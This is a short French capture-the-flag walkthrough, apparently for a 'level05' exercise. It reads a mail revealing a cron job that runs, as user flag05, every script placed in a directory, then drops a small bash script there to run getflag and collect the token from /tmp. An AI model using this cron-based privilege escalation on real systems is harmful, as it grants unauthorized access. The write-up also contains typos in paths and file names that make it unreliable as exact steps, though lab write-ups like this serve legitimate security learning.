redemarer votre vm ou ssh

on as un nouveau mail ? 

find / -type d -name "mail" 2> /dev/null

cd /var/mail

cat level05

*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

oh  ok ce mail nous dit que toute les 2min le programme openarenaserver vas s'execute, mais que fait ce programme ?

cat /usr/sbin/openarenaserver

on peux voir que ce script bash vas executer tout les programmes dans le dossier /otp/openarenaserver puis vas suprimmer le programme

on peux voir en faisant la -la dans le docier que ce sript bash a les permisions: -rwxr-x---+

le + signifie qu'il a des drois d'admin ou en tout cas supérieur au notre

ok, alors si on a les drois, on vas créer un petit programme

echo > test.sh

vim test.st

```sh
#!/bin/bash

# Commande dont vous souhaitez obtenir le résultat
commande="votre_commande" 
# de preférence getflag

# Chemin complet du fichier de sortie dans /tmp
fichier_sortie="/tmp/resultat.txt"

# Exécute la commande et redirige la sortie vers le fichier de sortie
$commande > $fichier_sortie
```

plus qu'a attendre 

cd /tmp

cat resultat.txt

voilla notre token 

Check flag.Here is your token : viuaaale9huek52boumoomioc
